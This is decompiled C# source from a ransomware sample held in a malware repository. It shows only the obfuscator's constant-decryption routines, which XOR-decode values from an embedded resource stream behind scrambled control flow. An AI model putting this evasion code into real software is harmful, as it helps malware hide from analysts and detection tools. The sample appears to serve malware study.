// Decompiled with JetBrains decompiler
// Type: =r�om*O�OCAk�i�
// Assembly: mtrl, Version=5.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 591BD174-6BA7-4AF8-A4DB-5D88FD31BDF3
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\HEUR-Trojan-Ransom.Win32.Generic-2c01a4b5df598caa723ca49a0e4b85d0a6bc07036550fe1bdc6fe8c7ff4495d2.exe

using System;
using System.IO;
using System.Reflection;
using System.Text;
using System.Threading;

internal static class \u003Dr\uFFFDom\u001E\u002AO\uFFFDOCAk\uFFFDi\uFFFD
{
  static object t\uFFFD\u007C\u0020\uFFFDH\uFFFD\uFFFDVnK\uFFFD\u000E\uFFFD\uFFFD\u001A(
    uint a,
    uint b)
  {
    MethodBase currentMethod = MethodBase.GetCurrentMethod();
    uint num1 = 633856597U ^ (uint) ((ulong) currentMethod.MetadataToken ^ (ulong) currentMethod.DeclaringType.MetadataToken * (ulong) a);
    int num2 = 2 - ~--2;
    uint num3;
    object obj;
    while (true)
    {
      uint num4;
      uint num5;
      uint num6;
      uint num7;
      int num8;
      do
      {
        int num9;
        do
        {
          switch (num2)
          {
            case 1:
              goto label_5;
            case 2:
              goto label_6;
            case 3:
              goto label_7;
            case 4:
              if (num4 >= 16U)
                break;
              goto label_9;
            case 5:
              goto label_10;
            case 6:
              goto label_11;
            case 7:
              goto label_12;
            case 8:
              goto label_16;
            case 9:
              num4 = (num1 & (uint) byte.MaxValue) % 64U;
              if (num4 < 0U)
                break;
              goto label_18;
            case 10:
              goto label_19;
            case 11:
              goto label_21;
            case 12:
            case 13:
              goto label_24;
            case 14:
              goto label_27;
            default:
label_2:
              if (num4 >= 48U)
              {
                num9 = (int) num4;
                num2 = 21 - 9;
                continue;
              }
              goto label_24;
          }
          if (num4 < 16U || num4 >= 32U)
          {
            if (num4 < 32U)
              goto label_2;
            else
              goto label_14;
          }
          else
            goto label_26;
        }
        while ((uint) num9 >= 64U);
        num2 = -~5 - 4;
        continue;
label_5:
        num5 += (num1 ^ num6 - 1U) % num4;
        num1 -= (uint) (~((int) num7 ^ (int) num5) + 2025049646);
        num2 = -~(--7 - -4);
        continue;
label_6:
        num7 ^= (uint) (((int) ((num1 & 16711680U) >> 16) | ~((int) num1 & (int) byte.MaxValue)) * (~(int) num1 & 16711680));
        num2 = ~7 + (9 - 7) + 7;
        continue;
label_7:
        num5 ^= (uint) ((int) num1 * (int) num6 + 1) % 16U;
        num1 += (uint) (((int) num7 | (int) num5) ^ 2025049646);
        num2 = -(-15 - (2 + 2 - (8 + 2)) + ~3);
        continue;
label_9:
        num7 |= (uint) ((int) ((num1 & 65280U) >> 8) & (int) ((num1 & 16711680U) >> 16) ^ ~(int) num1 & (int) byte.MaxValue);
        num2 = ~(9 - 7 + -5 - 6) - 5;
        continue;
label_10:
        num7 = 1706098936U;
        num2 = ~-(18 + ~(2 + 4));
        continue;
label_11:
        num7 ^= (uint) (((int) num1 & 16711935) << 8 ^ ((int) ((num1 & 16776960U) >> 8) | ~(int) num1 & (int) ushort.MaxValue));
        num5 += num1 * num6 % 32U;
        num2 = --(-(3 - 5) - -5);
        continue;
label_12:
        num1 |= (uint) ((int) num7 + ~(int) num5 & 2025049646);
        goto label_24;
label_14:
        num8 = (int) num4;
        num2 = ~(-5 - (-7 + ~2)) + 6;
      }
      while ((uint) num8 >= 48U);
      num2 = --~-9;
      continue;
label_16:
      num7 += (uint) (((int) num1 & (int) byte.MaxValue | (int) ((num1 & 16711680U) >> 16)) + (~(int) num1 & (int) byte.MaxValue));
      num5 -= (uint) ~((int) num1 + (int) num4) % 48U;
      num1 ^= num7 % num5 | 2025049646U;
      num2 = ~(-23 - ~9);
      continue;
label_18:
      num2 = -(~9 - -6);
      continue;
label_19:
      num5 = 582690799U;
      num6 = 1U;
label_21:
      if (num6 <= 64U)
      {
        num1 = (uint) (((int) num1 & 16777215) << 8) | (num1 & 4278190080U) >> 24;
        num2 = ~~18 - 9;
        continue;
      }
      num3 = num1 ^ b;
      if (!\u003CModule\u003E.ﮒ偺擐箆ᆔᡤಹӅ.TryGetValue(num3, out obj))
      {
        num2 = ~~(15 - (-2 - -3));
        continue;
      }
      goto label_53;
label_24:
      ++num6;
      num2 = -(~9 - (10 - --9));
      continue;
label_26:
      num2 = ~(2 - 3) + 6;
    }
label_27:
    byte num10;
    byte[] bytes;
    lock (\u003CModule\u003E.\uFFFD๗栰\u2384쑦\uEF3Cᤝ線)
    {
      BinaryReader binaryReader = new BinaryReader(\u003CModule\u003E.\uFFFD๗栰\u2384쑦\uEF3Cᤝ線);
      binaryReader.BaseStream.Seek((long) num3, SeekOrigin.Begin);
      switch (~-(-(4 - 6) - 1))
      {
        default:
          num10 = binaryReader.ReadByte();
          bytes = binaryReader.ReadBytes(binaryReader.ReadInt32());
          break;
      }
    }
    byte[] numArray = Assembly.GetCallingAssembly().GetModule(currentMethod.Module.ScopeName).ResolveSignature(385876214 ^ currentMethod.MetadataToken);
    int num11 = -(~7 - (5 - 9));
    while (true)
    {
      uint num12;
      ushort num13;
      ushort num14;
      ushort num15;
      int index;
      int num16;
      do
      {
        ushort num17;
        int num18;
        do
        {
          switch (num11)
          {
            case 1:
              num13 = num14;
              num15 = num17;
              num11 = ~(--3 - (2 + 5));
              continue;
            case 2:
              num18 = (int) num10;
              num11 = 8 - -(~7 - (5 - 3) - -9);
              continue;
            case 3:
              goto label_37;
            case 4:
              goto label_38;
            case 5:
              if (num10 != (byte) 163)
                goto case 2;
              else
                goto label_40;
            case 6:
              goto label_41;
            case 7:
              goto label_44;
            case 8:
              goto label_46;
            case 9:
              goto label_47;
            case 10:
              goto label_48;
            case 11:
              goto label_49;
            case 12:
              goto label_50;
            case 13:
            case 14:
              goto label_52;
            case 15:
              goto label_54;
            default:
              num13 = (ushort) ((num12 * (uint) num13 + (uint) num17) % 65536U);
              num11 = ~(-20 - (~5 - -3)) - 6;
              continue;
          }
        }
        while (num18 != 238);
        num11 = ~(-24 - (3 + ~5) + (3 + 2));
        continue;
label_37:
        index = 0;
        num11 = ~~12 - 6;
        continue;
label_38:
        num12 = (uint) (((int) num3 + (int) num10) * 679840784);
        num17 = (ushort) (num12 >> 16);
        num14 = (ushort) (num12 & (uint) ushort.MaxValue);
        num11 = -~9 - 9;
        continue;
label_40:
        obj = (object) BitConverter.ToSingle(bytes, 0);
        num11 = 5 - -9;
        continue;
label_41:
        if (index >= bytes.Length)
        {
          num16 = (int) num10;
          num11 = ~(-6 - 5 - -5);
        }
        else
          goto label_50;
      }
      while (num16 != 91);
      num11 = -(~12 - ~3);
      continue;
label_44:
      switch (num10)
      {
        case 55:
          obj = (object) Encoding.UTF8.GetString(bytes);
          num11 = ~(~6 - (5 + 3));
          continue;
        case 152:
          num11 = 12 + (2 - 7 + (4 - 3));
          continue;
        default:
          goto label_52;
      }
label_46:
      obj = (object) BitConverter.ToInt64(bytes, 0);
      num11 = -~~-13;
      continue;
label_47:
      obj = (object) BitConverter.ToDouble(bytes, 0);
      num11 = --13 - 2;
      continue;
label_48:
      num15 = (ushort) ((num12 * (uint) num15 + (uint) num14) % 65536U);
      ++index;
      num11 = -(-9 - -(5 - 4) - (3 - 5));
      continue;
label_49:
      num11 = -(~23 - ~9);
      continue;
label_50:
      bytes[index] ^= (byte) ((num12 * (uint) num13 + (uint) num15) % 256U ^ (uint) numArray[index % 8]);
      num11 = ~(-3 - (-7 - ~(2 + 2)));
      continue;
label_54:
      obj = (object) BitConverter.ToInt32(bytes, 0);
      num11 = ~(-13 + (4 - 6));
    }
label_52:
    \u003CModule\u003E.ﮒ偺擐箆ᆔᡤಹӅ[num3] = obj;
label_53:
    return obj;
  }

  static object \uFFFD\u0017\u003E\uFFFDH\uFFFD\uFFFD\uDB9A\uDCC8\uFFFDA_n\uFFFD(uint a, uint b)
  {
    MethodBase currentMethod = MethodBase.GetCurrentMethod();
    int num1 = ~-(18 - ~(2 - 5));
    Stream stream;
    uint num2;
    object obj;
    while (true)
    {
      uint num3;
      int num4;
      do
      {
        uint num5;
        uint num6;
        uint num7;
        uint num8;
        uint num9;
        int num10;
        do
        {
          switch (num1)
          {
            case 1:
            case 4:
              ++num9;
              goto case 23;
            case 2:
              if (num5 >= 48U)
              {
                num1 = ~~6 - -1 - (2 + 5);
                continue;
              }
              goto case 1;
            case 3:
              num3 = 778701630U ^ num7;
              num6 = 1238295993U;
              num1 = -(~3 - (3 + 7));
              continue;
            case 5:
              int num11 = (int) num5;
              num1 = -(-11 + 9);
              if ((uint) num11 >= 32U)
              {
                num1 = 9 - (9 - 22 - ~8);
                continue;
              }
              continue;
            case 6:
              num6 |= (uint) ((int) ((num3 & 65280U) >> 8) & (int) ((num3 & 16711680U) >> 16) ^ ~(int) num3 & (int) byte.MaxValue);
              num8 ^= (uint) ((int) num3 * (int) num9 + 1) % 16U;
              num1 = ~(-27 - -5);
              continue;
            case 7:
              num6 ^= (uint) (((int) num3 & 16711935) << 8 ^ ((int) ((num3 & 16776960U) >> 8) | ~(int) num3 & (int) ushort.MaxValue));
              num1 = 26 - 9;
              continue;
            case 8:
              num9 = 1U;
              num1 = ~-~-25;
              continue;
            case 9:
              num3 ^= num6 % num8 | 1609598343U;
              num1 = ~-7 - 5;
              continue;
            case 10:
              num8 -= (uint) ~((int) num3 + (int) num5) % 48U;
              num1 = 3 + 3 - (6 + ~5 - 3);
              continue;
            case 11:
              num6 += (uint) (((int) num3 & (int) byte.MaxValue | (int) ((num3 & 16711680U) >> 16)) + (~(int) num3 & (int) byte.MaxValue));
              num1 = ~(-13 - ~-6 - -7);
              continue;
            case 12:
              Monitor.Enter((object) (stream = \u003CModule\u003E.\uFFFD๗栰\u2384쑦\uEF3Cᤝ線));
              goto label_35;
            case 13:
              int num12 = (int) num5;
              num1 = -~(27 - (8 + 9 - -9));
              if ((uint) num12 < 48U)
              {
                num1 = 3 - ~(13 - 6);
                continue;
              }
              continue;
            case 14:
              num8 = 1922776410U;
              num1 = ~-(7 + 4 - (2 - 6) - 6);
              continue;
            case 15:
              num7 = (uint) ((ulong) currentMethod.MetadataToken ^ (ulong) currentMethod.DeclaringType.MetadataToken * (ulong) a);
              num1 = ~~--3;
              continue;
            case 16:
              num3 = (uint) (((int) num3 & 16777215) << 8) | (num3 & 4278190080U) >> 24;
              num5 = (num3 & (uint) byte.MaxValue) % 64U;
              num1 = -(-38 - (-3 - 7)) - 9;
              continue;
            case 17:
              num8 += num3 * num9 % 32U;
              num3 |= (uint) ((int) num6 + ~(int) num8 & 1609598343);
              num1 = ~-12 - 7;
              continue;
            case 18:
              num8 += (num3 ^ num9 - 1U) % num5;
              num1 = --29 - 9;
              continue;
            case 19:
              if (num5 >= 0U && num5 < 16U)
              {
                num1 = 25 + ~(9 + 9);
                continue;
              }
              if (num5 < 16U)
                goto case 5;
              else
                goto label_31;
            case 20:
              num3 -= (uint) (~((int) num6 ^ (int) num8) + 1609598343);
              goto case 1;
            case 21:
              num3 += (uint) (((int) num6 | (int) num8) ^ 1609598343);
              goto case 1;
            case 22:
              goto label_33;
            case 23:
              num10 = (int) num9;
              num1 = --18 - 2;
              continue;
            default:
              if (num5 < 64U)
              {
                num6 ^= (uint) (((int) ((num3 & 16711680U) >> 16) | ~((int) num3 & (int) byte.MaxValue)) * (~(int) num3 & 16711680));
                num1 = 23 + (4 - 4 - (8 - 3));
                continue;
              }
              goto case 1;
          }
        }
        while ((uint) num10 <= 64U);
        num1 = 5 - -2 - ~9 + 5;
        continue;
label_31:
        num4 = (int) num5;
        num1 = -~(8 - 4);
      }
      while ((uint) num4 >= 32U);
      num1 = 2 - ~(2 + ~~2);
      continue;
label_33:
      num2 = num3 ^ b;
      if (!\u003CModule\u003E.ﮒ偺擐箆ᆔᡤಹӅ.TryGetValue(num2, out obj))
        num1 = 7 - (-18 - -(7 + 9) + ~2);
      else
        goto label_49;
    }
label_35:
    byte num13;
    byte[] bytes;
    try
    {
      BinaryReader binaryReader = new BinaryReader(\u003CModule\u003E.\uFFFD๗栰\u2384쑦\uEF3Cᤝ線);
      binaryReader.BaseStream.Seek((long) num2, SeekOrigin.Begin);
      switch (-(8 - ~~4 - (8 - 4)))
      {
        default:
          num13 = binaryReader.ReadByte();
          bytes = binaryReader.ReadBytes(binaryReader.ReadInt32());
          break;
      }
    }
    finally
    {
      Monitor.Exit((object) stream);
    }
    byte[] numArray = Assembly.GetCallingAssembly().GetModule(currentMethod.Module.ScopeName).ResolveSignature(385876217 ^ currentMethod.MetadataToken);
    int num14 = --18 - 2;
    while (true)
    {
      int num15;
      int length;
      do
      {
        int index;
        uint num16;
        ushort num17;
        ushort num18;
        ushort num19;
        ushort num20;
        int num21;
        do
        {
          switch (num14)
          {
            case 1:
            case 8:
            case 17:
              \u003CModule\u003E.ﮒ偺擐箆ᆔᡤಹӅ[num2] = obj;
              goto label_49;
            case 2:
              num17 = (ushort) ((num16 * (uint) num17 + (uint) num18) % 65536U);
              num14 = ~-(~~9 - 2);
              continue;
            case 3:
              num19 = (ushort) (num16 >> 16);
              num18 = (ushort) (num16 & (uint) ushort.MaxValue);
              num14 = -(~-4 + -7);
              continue;
            case 4:
              num20 = num18;
              num14 = -(3 - (24 - (6 - 2 + (7 + 3))));
              continue;
            case 5:
              obj = (object) BitConverter.ToDouble(bytes, 0);
              num14 = --(2 + 8 + -3 - 6);
              continue;
            case 6:
              ++index;
              num14 = --(-~8 - -9);
              continue;
            case 7:
              num17 = num19;
              num14 = ~(~-2 - (6 - 4));
              continue;
            case 9:
              if (num13 == (byte) 152)
              {
                obj = (object) BitConverter.ToInt64(bytes, 0);
                num14 = --23 - 6;
                continue;
              }
              num21 = (int) num13;
              num14 = 4 + 9 - ~-6;
              continue;
            case 10:
              obj = (object) Encoding.UTF8.GetString(bytes);
              num14 = ~(-14 - --2) - 7;
              continue;
            case 11:
              obj = (object) BitConverter.ToInt32(bytes, 0);
              num14 = -(-24 - -(6 - 7) + (8 + 9));
              continue;
            case 12:
              obj = (object) BitConverter.ToSingle(bytes, 0);
              goto case 1;
            case 13:
              num14 = -(5 + 2) - -17 - -6 + 2;
              continue;
            case 14:
              switch (num13)
              {
                case 91:
                  num14 = 24 - (9 - ~9);
                  continue;
                case 163:
                  num14 = -~(--7 - -4);
                  continue;
                default:
                  int num22 = (int) num13;
                  num14 = 2 - ---7;
                  if (num22 == 238)
                  {
                    num14 = -~--10;
                    continue;
                  }
                  continue;
              }
            case 15:
              bytes[index] ^= (byte) ((num16 * (uint) num20 + (uint) num17) % 256U ^ (uint) numArray[index % 8]);
              num20 = (ushort) ((num16 * (uint) num20 + (uint) num19) % 65536U);
              num14 = ~-6 - 3;
              continue;
            case 16:
              num16 = (uint) (((int) num2 + (int) num13) * 679840784);
              num14 = -~6 - 4;
              continue;
            case 18:
              goto label_64;
            default:
              index = 0;
              num14 = ~-13 + -4 + 5;
              continue;
          }
        }
        while (num21 != 55);
        num14 = 8 - 2 + 7 - 12 - -4 + 5;
        continue;
label_64:
        num15 = index;
        length = bytes.Length;
        num14 = 4 - (-9 - 2);
      }
      while (num15 < length);
      num14 = -(-16 - (~4 + (5 + 6))) - 8;
    }
label_49:
    return obj;
  }

  static object \u0040\uFFFD\uFFFD\u005E\uFFFD\u007C\uFFFD\uFFFD\uFFFD\u002D\uFFFD\u00170\uFFFD\u005C(
    uint a,
    uint b)
  {
    MethodBase currentMethod = MethodBase.GetCurrentMethod();
    int num1 = -(~20 + (8 + 6));
    uint num2;
    object obj;
    while (true)
    {
      uint num3;
      uint num4;
      uint num5;
      uint num6;
      int num7;
      do
      {
        switch (num1)
        {
          case 1:
            goto label_5;
          case 2:
            goto label_6;
          case 3:
            goto label_7;
          case 4:
            goto label_9;
          case 5:
            goto label_10;
          case 6:
            goto label_12;
          case 7:
            goto label_13;
          case 8:
            goto label_14;
          case 9:
            goto label_16;
          case 10:
            goto label_17;
          case 11:
            goto label_18;
          case 12:
            goto label_19;
          case 13:
            goto label_21;
          case 14:
            if (num6 >= 16U)
              break;
            goto label_24;
          case 15:
            goto label_32;
          case 16:
            goto label_27;
          case 17:
            goto label_28;
          case 18:
            goto label_29;
          case 19:
            goto label_30;
          case 20:
            goto label_31;
          case 21:
            if (num6 < 0U)
              break;
            goto label_34;
          default:
            num3 += (uint) (((int) num4 | (int) num5) ^ 2110921814);
            goto label_32;
        }
        num7 = (int) num6;
        num1 = --~-4;
      }
      while ((uint) num7 < 16U);
      num1 = 19 + ~~2 - (5 + 4) - 7;
      continue;
label_5:
      num4 |= (uint) ((int) ((num3 & 65280U) >> 8) & (int) ((num3 & 16711680U) >> 16) ^ ~(int) num3 & (int) byte.MaxValue);
      num1 = -~--17;
      continue;
label_6:
      num3 = (uint) (((int) num3 & 16777215) << 8) | (num3 & 4278190080U) >> 24;
      num6 = (num3 & (uint) byte.MaxValue) % 64U;
      num1 = 5 - (7 + ~5 - 12 + ~4);
      continue;
label_7:
      if (num6 >= 32U && num6 < 48U)
      {
        num4 += (uint) (((int) num3 & (int) byte.MaxValue | (int) ((num3 & 16711680U) >> 16)) + (~(int) num3 & (int) byte.MaxValue));
        num5 -= (uint) ~((int) num3 + (int) num6) % 48U;
        num1 = ----19;
        continue;
      }
      if (num6 >= 48U)
      {
        num1 = ~~~-9;
        continue;
      }
      goto label_32;
label_9:
      uint num8 = 1;
      num1 = --5 - (8 - 6) + 9;
      continue;
label_10:
      if (num6 < 32U)
      {
        num4 ^= (uint) (((int) num3 & 16711935) << 8 ^ ((int) ((num3 & 16776960U) >> 8) | ~(int) num3 & (int) ushort.MaxValue));
        num1 = -(-6 - (~2 - (3 - 2) - -14));
        continue;
      }
      goto label_7;
label_12:
      num3 |= (uint) ((int) num4 + ~(int) num5 & 2110921814);
      goto label_32;
label_13:
      uint num9 = (uint) ((ulong) currentMethod.MetadataToken ^ (ulong) currentMethod.DeclaringType.MetadataToken * (ulong) a);
      num1 = -(18 + (-2 + ~7) - (8 + 9));
      continue;
label_14:
      if (num6 < 64U)
      {
        num4 ^= (uint) (((int) ((num3 & 16711680U) >> 16) | ~((int) num3 & (int) byte.MaxValue)) * (~(int) num3 & 16711680));
        num5 += (num3 ^ num8 - 1U) % num6;
        num1 = --28 - 8;
        continue;
      }
      goto label_32;
label_16:
      num3 = 1195708073U ^ num9;
      num1 = ~~(~4 - (3 + 3) - -28);
      continue;
label_17:
      num5 = 1912003361U;
      num1 = ~-3 - (4 - 9) - 3;
      continue;
label_19:
      if (num8 > 64U)
      {
        num2 = num3 ^ b;
        num1 = -~(16 + (8 + 4 - (7 + 9)));
        continue;
      }
      goto label_6;
label_21:
      if (!\u003CModule\u003E.ﮒ偺擐箆ᆔᡤಹӅ.TryGetValue(num2, out obj))
      {
        num1 = 18 - -~6;
        continue;
      }
      goto label_44;
label_24:
      num1 = ~(-21 - (-9 + ~4)) - 5;
      continue;
label_27:
      num5 += num3 * num8 % 32U;
      num1 = 9 + ~(6 + 5) - ~8;
      continue;
label_28:
      num4 = 83613656U;
      num1 = 2 - ~(--8 - 1);
      continue;
label_29:
      num5 ^= (uint) ((int) num3 * (int) num8 + 1) % 16U;
      num1 = ~(~-6 - (2 + 4));
      continue;
label_30:
      num3 ^= num4 % num5 | 2110921814U;
      num1 = ~6 + ~4 - -8 - ~9 + 9;
      continue;
label_31:
      num3 -= (uint) (~((int) num4 ^ (int) num5) + 2110921814);
label_32:
      ++num8;
      num1 = 8 + 7 - (9 - 15) - 9;
      continue;
label_34:
      num1 = --9 + 5;
    }
label_18:
    byte[] bytes;
    byte num10;
    lock (\u003CModule\u003E.\uFFFD๗栰\u2384쑦\uEF3Cᤝ線)
    {
      BinaryReader binaryReader = new BinaryReader(\u003CModule\u003E.\uFFFD๗栰\u2384쑦\uEF3Cᤝ線);
      binaryReader.BaseStream.Seek((long) num2, SeekOrigin.Begin);
      int num11 = ~~~-2;
      while (true)
      {
        switch (num11)
        {
          case 1:
            num10 = binaryReader.ReadByte();
            num11 = ~-~-2;
            continue;
          default:
            goto label_37;
        }
      }
label_37:
      bytes = binaryReader.ReadBytes(binaryReader.ReadInt32());
    }
    byte[] numArray = Assembly.GetCallingAssembly().GetModule(currentMethod.Module.ScopeName).ResolveSignature(385876216 ^ currentMethod.MetadataToken);
    int num12 = --13 - (9 - 7);
    while (true)
    {
      int index;
      int num13;
      int length;
      do
      {
        switch (num12)
        {
          case 1:
            goto label_44;
          case 2:
            goto label_45;
          case 3:
            goto label_47;
          case 4:
            goto label_48;
          case 5:
            goto label_49;
          case 6:
            goto label_51;
          case 7:
            goto label_53;
          case 8:
            goto label_52;
          case 9:
            goto label_54;
          case 10:
            goto label_56;
          case 11:
            goto label_57;
          case 12:
            goto label_58;
          case 13:
            goto label_62;
          case 14:
            goto label_63;
          default:
            num13 = index;
            length = bytes.Length;
            num12 = 7 - -~-8;
            continue;
        }
      }
      while (num13 < length);
      num12 = ~(8 + 2) - -20 - 5 - 2;
      continue;
label_45:
      if (num10 == (byte) 91)
      {
        obj = (object) BitConverter.ToDouble(bytes, 0);
        goto label_52;
      }
      else
        goto label_58;
label_47:
      ushort num14;
      ushort num15 = num14;
      index = 0;
      num12 = -~20 - 8;
      continue;
label_48:
      ushort num16;
      ushort num17 = num16;
      num12 = -(11 + ~(7 + 3)) + 3;
      continue;
label_49:
      if (num10 == (byte) 152)
      {
        obj = (object) BitConverter.ToInt64(bytes, 0);
        goto label_52;
      }
      else
        goto label_54;
label_51:
      obj = (object) Encoding.UTF8.GetString(bytes);
label_52:
      \u003CModule\u003E.ﮒ偺擐箆ᆔᡤಹӅ[num2] = obj;
      num12 = ~~(9 + 5 + 5 - 18);
      continue;
label_53:
      uint num18;
      num15 = (ushort) ((num18 * (uint) num15 + (uint) num16) % 65536U);
      ++index;
      num12 = -(-10 - ~9);
      continue;
label_54:
      if (num10 == (byte) 55)
      {
        num12 = ~-(11 - ~-5);
        continue;
      }
      goto label_52;
label_56:
      num16 = (ushort) (num18 & (uint) ushort.MaxValue);
      num12 = 9 - (~6 - -12);
      continue;
label_57:
      num18 = (uint) (((int) num2 + (int) num10) * 679840784);
      num14 = (ushort) (num18 >> 16);
      num12 = -(-7 + -3);
      continue;
label_58:
      if (num10 == (byte) 163)
      {
        obj = (object) BitConverter.ToSingle(bytes, 0);
        goto label_52;
      }
      else
      {
        if (num10 == (byte) 238)
        {
          obj = (object) BitConverter.ToInt32(bytes, 0);
          num12 = ~(~(3 - 5) - 7) + 3;
          continue;
        }
        goto label_49;
      }
label_62:
      num12 = 4 - -(8 - (5 + 6) - 1);
      continue;
label_63:
      bytes[index] ^= (byte) ((num18 * (uint) num17 + (uint) num15) % 256U ^ (uint) numArray[index % 8]);
      num17 = (ushort) ((num18 * (uint) num17 + (uint) num14) % 65536U);
      num12 = ~-~-9;
    }
label_44:
    return obj;
  }
}
